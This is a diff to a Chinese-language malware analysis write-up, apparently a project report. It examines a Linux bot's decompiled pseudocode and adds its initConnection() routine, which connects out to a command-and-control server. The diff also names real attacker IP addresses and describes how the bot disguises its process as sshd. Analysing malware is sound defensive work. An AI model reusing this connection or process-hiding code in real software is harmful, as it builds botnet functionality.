@@ -167,7 +167,7 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 # 分析
 從上述的 pseudocode 可以看出該惡意程式的運作大致能分為以下步驟
 1. **初始化：**
-  * 惡意軟件檢查/usr/bin/python系統上是否存在。如果不存在，則設置``v20``為/usr/sbin/dropbear，否則設置``v20`為sshd。
+  * 惡意軟件檢查/usr/bin/python系統上是否存在。如果不存在，則設置``v20``為/usr/sbin/dropbear，否則設置``v20``為sshd。
   * 它檢查有效用戶 ID 是否為 ``root (0)``。如果是，則將 設為``userID0``。
   *  它使用``strncpy``和``sprintf``將 process 的名稱修改為``sshd``或是 ``usr/sbin/dropbear``。
   *  調用該``prctl``函數來設置 process 的名稱，使其更難以在 process list 中檢測到。
@@ -185,14 +185,51 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 
 
 # 細節分析
-對著原本 pseudocode 中的`initConnection()`點兩下，即可看到該子程式的 pseudocode 
+## initConnectioninitConnection
+對著原本 pseudocode 中的`initConnection()`點兩下，即可看到該副程式的 pseudocode 
 
-![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/initConnection_%E7%B4%B0%E7%AF%80.png)
-此時可一窺其運作細節，此時可看到其中有個名為commServer的可疑數組
+```
+_BOOL8 initConnection()
+{
+  __int64 v0; // rax
+  char v2[4108]; // [rsp+10h] [rbp-1010h] BYREF
+  unsigned int v3; // [rsp+101Ch] [rbp-4h]
 
-![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/commServer_%E7%B4%B0%E7%AF%80.png)
+  memset(v2, 0LL, 4096LL);
+  if ( KHcommSOCK )
+  {
+    close((unsigned int)KHcommSOCK);
+    KHcommSOCK = 0;
+  }
+  if ( KHserverHACKER == 3 )
+    KHserverHACKER = 0;
+  else
+    ++KHserverHACKER;
+  szprintf(
+    (unsigned int)v2,
+    (unsigned int)"%d.%d.%d.%d",
+    hacks[KHserverHACKER],
+    hacks2[KHserverHACKER],
+    hacks3[KHserverHACKER],
+    hacks4[KHserverHACKER]);
+  v3 = axis_bp;
+  if ( strchr(v2, 58LL) )
+  {
+    v0 = strchr(v2, 58LL);
+    v3 = atoi(v0 + 1);
+    *(_BYTE *)strchr(v2, 58LL) = 0;
+  }
+  KHcommSOCK = socket(2LL, 1LL, 0LL);
+  return (unsigned int)connectTimeout((unsigned int)KHcommSOCK, v2, v3, 30LL) == 0;
+}
+```
 
-可以發現攻擊者的ip是 `45.56.96.91:23`
+此時可看出攻擊者的IP會存在``hacks``, ``hacks2``, ``hacks3``, 與 ``hacks4``等4個數組中
+點進去後可以發現，其ip其實就是`37.49.230.128`
+
+![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/hacks.png)
+
+
 
 
 
